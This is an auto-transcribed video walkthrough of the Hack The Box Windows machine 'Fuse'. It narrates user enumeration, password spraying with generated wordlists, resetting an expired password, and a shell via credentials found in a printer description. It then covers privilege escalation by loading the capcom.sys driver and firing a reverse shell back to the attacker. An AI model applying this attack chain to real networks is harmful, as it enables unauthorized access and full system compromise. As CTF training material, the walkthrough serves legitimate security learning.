 what's going on youtube this is ipsec i'm doing fuse from hack the box which was a really fun windows box in the medium difficulty range the whole premise of it is exporting a corporation's like automated printer install process you see a web page of the printer and are able to enumerate a bunch of usernames that you can use to guess a password to get into the environment the trick is though the password that you guess is expired so you have to find a way to reset that expired password and then you query the domain you look at the installed printers of the domain and see the printer passwords actually in the description and use that to spray again to get a shell into the domain as the print service the print service can load a driver so it can load the printer's driver but you can also use it to load malicious drivers so we load the capcom.cis exploit we used in the fighter machine and then just exploit that capcom.cis for privvesque so with all that being said let's just jump in as always we're going to start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it fuse and then the ip address which is 10 10 10 193 this can take some time to run so i've already ran it looking at the results we have a bunch of ports open the first one i see is dns on port 53 then we have http on port 80 and it's telling us it's iis version 10 and i know version 10 is probably going to be windows 2016 or 2019 you can just go and google like iis versions probably and if you go to the very first one wikipedia kind of has a bunch of listings and we can see version 10 right here is 2016 and it's also 10 2019. i guess microsoft stopped updating this as much because back here we can see like 8.0 was 2012 and 8.5 is 2012 r2 so again not sure why they didn't change from like 10 to 10.5 or 11 but they didn't so 10 can be either those two windows versions it's not too important uh the next port we have is kerberos and we get the server time which could be important we have a bunch of rpc ports ldap is running i think this is like encrypted kerberos more rpc ldap secure and it does leak the hostname which is fabrycorp.local so we could either just edit a host file to include this so a machine knows where this domain is or we can um edit a resolve.com and i'm going to opt for adding a resolve.com that way if there's other dns names it just automatically gets it and you can do this whenever you see dns so i'm going to edit this and we can do name server and put this here um the main issue you're gonna have is this is going to query the domain controller whenever you go to um go to an internet site and it's going to probably go slow you could put it below yours but then i think it may go slow when you try to resolve fabicorp.local depending how your dns on your computer is configured so i'm just going to accept when i browse the internet it's going to go slow and we'll save this file and there's not too much in nmap except again with the bios uh hostname is whatever but let's go take a look at the website so i'm going to go to 10 10 10 193 and we get redirected to this web server i see it's paper cut print logger so the very first thing i'm going to do is a search point on paper cut and we get nothing we could go and google around but before i go and google around i'm just going to click and explore this web application i also see the copyright is 2012 which indicates probably gonna be good for a cve and then we could also go like to the website and see if there is a change logger other things but looking at these links it's all going to htm files so i don't know if there's actually going to be anything juicy to attack because this looks like it just generates a bunch of static sites and if we don't have user input then we can't really do much attacking we could um like try for open directories so like go to slash html we just see this we could go to like slash logs we get access denied but it doesn't really look that great i was hoping that it would be like um papercut index.html question mark uh view and then a date like 20 20 10 30 i think today's date is or something if it was like this and we're passing it a parameter to the site we have a parameter to attack but this is just going to a blank page so nothing too good there um clicking on the actual print logs let's see we got this is 30 may 29 and let's get 10 june we have a few host names or not hostnames but usernames and potentially clients like laptop seven lawn workstation 19 jumper one so some good information there but the main thing i want is user names so i'm going to grab these usernames so let's do v users and start pasting these there go to the next one this one's s thompson and then we got b halt and administr administrator and let's see if these users are valid on the domain and to do that i'm going to use a program called curbroot and if you go to ipsec dot rocks we've done it already once before my internet is going to go slow because i edited my resolve.host so we'll just resume that later but i'm going to do locate curb root to see where else i have this installed i'm just going to copy it off of block blackfield and we'll copy it to this directory if you don't have curb root you can just go to github and install it if you want to see other things again just go to ipsec.rocks type your query and you'll get links to what you want to do so um curbroot dash h to get help and we're going to want to do the user aneum and let's see probably the domain string uh fabry corp.local and we can just do this because we pointed our dns to the server so this resolves and then we need the username file so we'll just call um what do we call it users and we run and everything looks like it is valid so one of the things i also like doing is i like putting in a user i don't think exists so like please subscribe because the server could be configured in a way for some reason it just says everyone's valid so you need to put a like known negative in so you know yes indeed if it wasn't a valid username you wouldn't have got it so we see tested six users five valid please subscribe doesn't exist so we know our username list is correct so the next piece we need is to get a out of this so we could try just crack map exec blindly with a bunch of passwords but it's always a tough idea to go blind with guessing passwords maybe like password one exclamation point if you have a lot of users that could be good or password 2020 but for a hack-the-box machine probably not going to be that doesn't mean you shouldn't try it but i'm not going to waste your time so there are two ways we can go about it first we're going to go about it the what i think is the lame way and the lame way is let's do it through um cool so we can do 10 10 10 193 and i call this the lame weight just because like so many places cover it and i don't really whenever i do engagements it doesn't really benefit me that much but i like showing it because it works in this scenario so cool would do the depth of seven this is how many pages deep it's gonna go probably the max would be two or three but i just like giving it a large depth uh the minimum word length dash m i'm gonna do eight because most passwords require um eight characters uh w for outfile cool.out and then we can put the uh initial page we want to crawl here and now it's going to download everything um it should i hope stay here and not go and click this link and crawl papercut.com i'm not positive about that one like i said i don't use cool that often so with this list now we can do a cme crack map exec um smb 10 10 10 193 dash u users p cool that out and now it's going to try to brute force all the passwords and we'll get a bunch of login failures eventually we'll see some success but the way i like going about this is using a custom word list so i'm gonna do v costume i guess i'm gonna put two things um i'm always gonna begin with a capital letter because let's be honest most passwords will begin with a capital letter that are default just because of password policy things like password policies almost always going to require a capital letter so people put it at the beginning because it's natural so the domain name winter summer you can go on with a bunch of other ones and wait did this not get the password wow p merton t-level i don't know oh um there's one flag we probably missed in order for cool to grab words with numbers in it you have to specify um i think let's do cool dash h uh what is the flag dash dash with numbers so we'll do dash dash with numbers and then when that finishes we'll just run crack map but again get a few things get a few words you think it may be i'm sure you can be creative and go larger than this but once you have these three words then i would recommend doing hashcat so you can do hashcat dash dash force if you don't have a gpu um never use this to actually crack but for generating a password it's fine or a password list it's fine um so the word list and we have fabry corp1 here for his password but the word list is going to be custom and we're going to specify the rule file so user share cat rules and i'm going to do best 64 and then dash dash std out and we'll direct it to um hashcat words so we can cat custom we have these three things but if we less hashcat words it's done all the work for us of generating a nice word list so we know based upon this uh fabry corp 01 was the password so we can search this and see if we actually got it so we can search fabric or pro 1 and yes the hashcat thing would have got it but it just does a bunch of good ones and if you want to you can go and create your custom rule to do things that this wouldn't do like maybe add an exclamation point to the end of the word so if we wanted to do that um it's pretty simple we just go over to google and google like hashcat rules and probably have to give this some time to bring the page back because again internet's slow because of how i did dns but we can do vi append exclamation dot rule and then all we do is a dollar and then exclamation point and that's going to put exclamation at the end of every word so if we go back to our hash cat command i'm going to get rid of this base64 rule we're just going to do append exclamation we still need scd out and we can see an appended estimation point to everything the downside with this just happened was it didn't do nothing which means we just append an exclamation point to everything but we still don't have the original word so when you do this custom rule i would recommend also having a colon and that is the do nothing rule in hash cap and you can see now it's kind of how we expected it um let's see oh hashgat rule okay there we go the very first one so this page is going to have exclamations of how these rules work but what we would also probably do is double rule this so we'll do dash r user share cat rules best 64. and then we can i'm just going to write that to temp but if we do a wc-l on temp and a wc-l on what we call the last one hashcat words you can see temp is now double the size of the last one but it's just the um last one and then everything also has an exclamation appended to it and i chose exclamation because let's be honest that is the most common character a password is going to end with so this would be the superior word list to use when you do this type of operation whenever you do brute forcing you should always be careful to make sure you're not locking accounts out because if you start locking everyone out because of failed password attempts you're gonna have a bad day but um looks like we have it good and let's do out of curiosity uh ls or wc-l on cool.out so that's only 45 words our custom one that we did was 231 so uh google definitely had less words but you'd argue that probably the hashgap words would work in more scenarios because having the domain name zero one on a web page that you happen to cool is not too likely this is very contrived scenario where that works so um you notice that crack map exec stopped on password must change uh if we wanted to we could probably tell crack map exec to continue uh what is continue content dash dash continue on success so that's probably what we'd want to do so we see everything but let's go see if we can play with this password must change so i'm going to grab this and while that goes we can go down here the creds paste the cred and then just cut it and now we can try to use opc client to change the password so dash u t level and then 10 10 10 193 and we want to put his password which is just fabicorp01 and we put this in and we can't uh even log in because empty status password must change uh we could try like a null authentication and it looks like it lets us in and then we can try changing his password with um what is it i think it's set user info 2 t-level 23 please subscribe exclamation point and we get new user session keys so we can't change it because we're not logged in we could try like dumping users with enum dom users but access denied so our pc client is a bust there is another tool that can set passwords and it's called smbpasswd so let's try this t level and then dash r for the realm and we can do fabrycorp.local and then his old password fabrycorp 01 please subscribe exclamation point please subscribe exclamation point if i typed it correctly both times will it work and if i type the domain name correct will it work uh fabry corp.local i think i did not oh if you want to go to the hashcat rule file this is it so it's just very simple like uh do nothing this lowercase is all letters um if we wanted to put something at the beginning it's carrot then what we want to put i just said a pen character so dollar then the character so you can read all this and play with it if you want if you don't know what i did with set user info we could also google like rpc password and i explain it better in this video but uh who's unreachable what was the domain name that's why i went back to my password fabry corp dot local what maybe i need fuse.fabric.local uh if we ping this it doesn't go um i wonder if we do sudo vi etsy resolve dot com and we do search and then put the domain name which is fabrycorp.local is that going to work now nope we do fuse i'm not sure why that's not working um we're going to just ignore that and we'll put an ip address for the realm 10 10 10 193 uh the old password was fabry corp 01 please subscribe i just typed that fabry corp r1 please sub you know what please subscribe exclamation point sometimes i really hate not being able to see what i'm typing fabry corp 01 paste paste and the password has been changed for this user so now if we did crack map exec on uh was it key level and then the password of this we get in but don't say pwned so we could try the other way that you commonly get a shell which is when rm and see if we can do win or m to get in and i don't think he can we'll let that go we could look back up here and we have a few of these that password must be changed like b halt uh t-level yeah a few of them that must but uh we try this again and it says access denied let's go back to smb and we get login failure so i guess there's something on this box that is resetting the password or there's someone else on the box doing at the same time so i'm going to do fabry corp 01 paste it make sure i pasted what i thought oh i did not so let's copy this fabry corp r1 paste paste uh the password some password see fabry corp 01 paste add exclamation point so it may have some type of like um password memory and the default on windows is remember the last 24 passwords that don't let you set it to the same thing twice so that's why i just add an exclamation point so let's go back to the winrm and we'll try it with two exclamations and at the same time let's do rpc client dash capital u t level um 10 10 10 193 log in and man i think this is going to be annoying i think the thing set resets the password every single minute so we have to be quick so let's do fabry corp one paste paste run fabry corp 01 paste paste okay changed his password do that and our pc client to log in so that winner m's taking its time but we actually got in this way so now we can do enum dom users since we have an active session to active directory and get all the usernames so let's get everyone that we're missing because there are more users than here here i mean i think we had five before and now it looks like we have like nine or something so vi users two uh did i not copy clipboards always sometimes behave wonky so we can cat users too and then i'm going to do alt dash capital f print 1 print 2 and then we're going to do another arc on the other side of the bracket and there's a better way to do this but whenever i try awk with multiple field separators especially these brackets i just have trouble so that's why i separate into two and we direct that to the users file so now we have just a list of every user on the box so we could probably get rid of that default account and krb tgt because those are never going to be valid but we could now if we wanted to rerun a crack map exec and see if we get anything else so let that run um there is a service account so generally service accounts i like uh seeing how they're configured so you can do query user 0x450 and we can see pretty much nothing about it it is a print account and then this is also a printer so i'm going to do enum um printers i think to query smb for the printer information and we get a password it looks like so this is the description for the printer and it says it's near the it area the scan to docs password is uh fabry service or something so let's go back and do another crack map exec so cme uh smb 10 10 10 193 dash u um users and dash p put this password in so let's run this and see what we get right off the bat we have svc dash print has that password uh it doesn't say owned so just like last time let us try winrm see if we get anything different over winrm and we get a shell so we can probably do evil when rm uh i think it's dash i for ip dash i 10 10 10 193 dash u svc print n-p we'll put the password in copy paste and if this didn't work i'd probably go back to hashcat to try a bunch of variations like adding an exclamation point to the end removing one a bunch of things like that but we get a shell on this box generally the very first thing i do when i get a shell is do it who am i slash all just to see like what groups i'm a member of what tokens i have because if i see like essie impersonate i know i'd go to like rogue potato or juicy potato but generally like just running that command so let's see the groups we're in everyone print operators users pre windows 2000 remote management users so this is why we can do winrm network authenticated users this organization i.t accounts ntlm and highmandatory let's look at the privileges we have we can add workstations to the domain we can load or unload device drivers and this is super dangerous because we can just put something in the kernel essentially uh shut down change notify and increase working set privilege we're going to hone in on this se low driver privilege and the reason why this account probably has it is so it can load the printer driver but we can load malicious drivers and since they operate in the kernel we can do really bad things so one of the most common drivers that people load would be like the capcom.sis because it's easily exploitable but there's a bunch of other drivers you can find but we'll do capcom and if you want this exploit explained a bit better i recommend watching the fighter video because i think we'll go through it more in depth but we're just going to load capcom.cis onto this machine and then exploit it pretty quickly so let's do that in order to do that though we need to get on a windows machine with visual studio so here we are on a windows machine i just installed the commando vm which if you don't know how to do you can just go to ipsec.rocks and type that in but we're going to google sc load driver privilege and the very first post is abusing it and if we go to this post it'll explain everything we need to do so i'm just going to scroll to the relevant part which is this file and this is going to load the driver for us the next thing we need is a utility to exploit capcom.cis so i'm going to google well before we even exploit capcom. says we need to download it so i'm just going to go to fuzzy security and type capcom.sis because this is the blog post that had um most of the information about exploiting it in that fighter video and we're at capcom rootkit drivers capcom.sis we can download this file keep it and we're going to show the files in our downloads and hope i don't have anything sensitive here everything looks fine thank god um create a new folder and we're going to call this fuse and we're going to start putting things into this so first we want that the next thing is we want to grab this tarlogic thing uh i'm just going to get clone it so cmd go into downloads fuse and then get clone paste and we have that the last thing we need is the actual utility to exploit capcom.sis so i'm going to go back to the web browser and we're going to google exploit capcom github and go to the first one so we got another github repo so we can just go and get clone this as well and we just have to compile these so let's go open up a browser or not browser folder and let's go to this eop driver load and does this have compile instructions let's see open i have no clue why that wants to open like that that looks bad let's see does not have compile instructions so we're just going to create a new visual studio project and wing it so visual studio it is a c plus file so we can open this edit and let's see is there a main here there is a main so i'm just going to copy this whole thing uh let's do let's see create new project and then empty project let's see do i want i'll do a console app and this will be um load driver create and now we're here so i'm just gonna go into the c plus file and then we're going to paste what we had from the other one and i'm going to change this to release 64-bit and we're gonna hope this builds rebuilding cannot open that not exactly sure why it's airing i think that's just a pre-compile header so i probably messed up when i was creating the project but i think we can remove that safely so now if i rebuild this solution without that let's see if it builds we got an exe so if we just have it not work on us we know we'll probably have to um go back and revisit that but i think it'll work so i'm just going to go into this directory and we're going to copy the load driver exe out of it so we were in downloads so let's just go back here and paste that and the next thing we have to compile is exploit capcom and let's see if they have a project file they do so let's do file open project solution and we'll go to see colon users ipsec downloads fuse exploit capcom whoops load this and this looks better so let's just go to release rebuild solution and i think exploit capcom is going to ask us to execute a binary so i think we do like dot slash exploit capcom and then the tool we want to run which i think we're going to try a powershell script if that doesn't work we'll create like a c plus plus or net reverse shell so we have this tool now let's go back to the folder exploit capcom x64 release and we'll copy this here and do we have python on this python3 it's opening windows store python we do have python 3 as just the python so let's quit this control z there we go uh ipconfig 135 is this computer's ip so python dash m http dot server and we'll go to 135 so let's go to parrot and make dirt dub dub dub cd dub dub dub actually we don't need to go there we can just download everything so w get 10 10 nope 172 1610 135 port 8000 and load driver.exe i think oh connection refused 135. do a firewall up i can't imagine that uh can we paint my box let's see thing 172 16 10 135 we can we can check the firewall firewall let's see off off off so there's no firewall let's see ctrl c out of that oh god there we go let's do 172 1610 135 colon 8000 is that how we specify so it wants dash dash bind there we go so now we just told the server to bind to that address so w get there we go uh we actually connected to it but it doesn't look to be working oh i hit enter and looks like it worked um let's see the next one was i think exploit capcom and capcom.sis so exploit capcom.exe and capcom.sis so now we've downloaded everything uh we can exit this rpc and we can go to cd backslash temp is this a directory cd backslash windows temp is this a directory it is so we can upload capcom.sis and upload load driver.exe upload exploitcapcom.exe and we'll probably want to uh make dirt dub dub dub now go into it and we need doing the shang reverse shell so cp user share machine uh shells invoke reverse uh invoke let's see powershell tcp ps1 to rev.ps1 and let's go to the reverse example i like just deleting this line putting at the bottom and we can say the ip address is 10 10 14 3 which is my parrot box and the port is going to be 9001 so we can save that and let's just upload this actually to the machine so i'll copy that out of my www directory so we can just do upload rev.ps1 there we go so let's look at how we load the driver uh let's go i guess back to commando because we had the post up here oh god zoomed in too far uh load driver.exe so register registry key driver path so system current control set my service and then capcom.cis so system current control set is what we want so let's do load driver.exe system current control set uh please subscribe c colin windows temp i hope we put everything in temp capcom.sis see if it uploads uh we probably have to do dot backslash loading driver i think that's good when error zero so i'm guessing there is no error message um i'm hoping that's what it means i think we can do like get windows driver dash all maybe um get windows driver is this a command uh please subscribe is that what we called it dash online dash all requires elevation we're going to assume it's installed so the next thing we want to do is um exploit capcom i think we just called it like this dot exe and c colon windows temp rev.ps1 and system shell was launched looks like it loaded it but it doesn't look like we got our powershell we could try powershell like this does this work um powershell ix yeah iwr url 1010 14 3 9001 test i'm just saying if um this would have hit a web server i'm going to test this command is it uri not l okay it's uri so now we have a powershell command we know we'll be able to hit a web server so we can just test if this exe will work with powershell oh come on there we go so here uri and it's not hitting this thing so we probably want to create a exe so let's go back to commando and we'll do c plus plus reverse shell windows is this it first.c server i don't want a server um let's just do dot net reverse shell there we go this seems to be good so we can go back to oh we can probably just compile this with um csc on this box so i'm going to close out of this the rev dot um what's dot nets extension what extension are you i honestly don't know what dot nets extension normally is we'll just call it dot c i guess i don't think extension matters so we can upload rev.c uh if i typed it right and i just realized i did not put the ip address in this so that would have been bad so 10 10 14 3 would do port 9001 there we go and we'll delete rev.c and then upload rev.c and i just remember the extension for net it is cs so if we have an issue we'll uh do cs let's see so we want to go to see colon windows microsoft.net framework 64. cdv v4 and i think csc.exe is here so dot slash csc.exe slash t c colon windows temp rev.exe no t is target so t will be exe and then out is the name so this will be c colon windows temp rev.exe and then the file which is c colon windows temp rev.c could not be found let's see cd backslash windows temp let's move rev.c to rev.cs upload rev.cs going to copy this directory slash csc.exe and we'll redo this rev.cs drc colon windows temp i wonder if it doesn't like this file being in temp type rev.cs file logs definitely exist let's see delete all of this follow definitely exist let's just do dir and slash uh there is a readme type sql backslash readme.txt let's see test directories has been created diagnosing issues the folder should be used maybe we can just put that in this folder so copy rev.cs to sql and backslash this and go back up to this rev.cs sql and backslash pause the part of this it's got a warning but i think we got rev.exe existing we can dot slash rev.exe to make sure it works and clvnp and we get a reverse shell so we know reverse shell works it's a bit slow i don't know why it's going slow and okay this is fine let's do this exploit capcom thing again go all the way up and this will be rev.exe run this we don't get a shell c colon windows temp maybe it wants the full path no let's copy rev.exe out of temp what is this so we'll copy it into that directory that we can write to it's gonna be really weird if it just doesn't like where we have it dot slash exploit capcom.exe copy this rev.exe so i think we have to modify maybe this exploit capcom.exe to launch out of our v i don't think it's doing that um we just see system shell was launched so going back over to our commander vm let's go and do exploit capcom and look at the source so source files export capcom dot c plus plus and i'm going to search for system shell and we see right here there's this function launch shell if it returns false we say create process failed so we're not getting create process failed so it is working uh let's just see what the code around launch shell is and it looks like it's hard coded just to do cmd.exe let's see is it pulling command line null point on our pointer doesn't look like it's doing any um arguments with this so let's just do temp rev.exe and we'll recompile it and before we do system shell we're going to do uh c colon windows temp rev.exe and the reason why i'm modifying this is just so um i know we're running the latest code because if i see system show was launched i know we didn't copy capcom.sist or exploit capcom over top of what we needed to so always like changing the output of something just slightly so we know we're doing the right thing so users ipsec fuse exploit capcom and we will copy this over top and do we still have our web server running we do so we can w get uh let's slash exploit capcom there we go uh move dot one over exe like that run this again and we can upload exploit capcom.exe and it's uploading now let's just execute it and we get rid of a shell awesome so that was the issue uh probably should review code before we run it uh we would have definitely caught that if we looked at exactly what the tool was doing but for some reason i thought this accepted an argument so we can do dir who am i and we are nt authority system so we could go users desktop whoops cd users administrator desktop and get root.txt if we wanted to so hope you enjoyed the video take care and i will see you all next week